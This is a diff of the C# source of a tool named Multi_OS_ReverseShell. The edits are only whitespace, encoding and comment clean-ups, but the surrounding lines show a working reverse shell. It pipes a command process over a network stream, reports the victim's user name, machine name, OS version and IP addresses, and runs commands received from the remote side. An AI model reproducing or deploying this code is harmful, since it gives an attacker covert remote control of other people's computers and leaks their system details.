@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Diagnostics;
 using System.IO;
 using System.Net;
@@ -62,7 +62,7 @@ namespace Multi_OS_ReverseShell
                 processCmd.BeginOutputReadLine();
                 processCmd.BeginErrorReadLine();
             }
-			IPAddress[] localIPs = Dns.GetHostAddresses(Dns.GetHostName());
+            IPAddress[] localIPs = Dns.GetHostAddresses(Dns.GetHostName());
             streamWriter.WriteLine("\n--[ Multi-OS ReverseShell ]---------------\n");
             streamWriter.WriteLine(" USER\t" + System.Environment.UserName + "\n LOCAL\t" + System.Environment.MachineName + "\n OS\t" + System.Environment.OSVersion);
             streamWriter.Write(" IPs\t");
@@ -82,7 +82,6 @@ namespace Multi_OS_ReverseShell
                 try
                 {
                     strInput.Append(streamReader.ReadLine());
-                    //strInput.Append("\n");
                     if (strInput.ToString().LastIndexOf("terminate") >= 0) StopServer();
                     if (strInput.ToString().LastIndexOf("exit") >= 0) throw new ArgumentException();
                     processCmd.StandardInput.WriteLine(strInput);
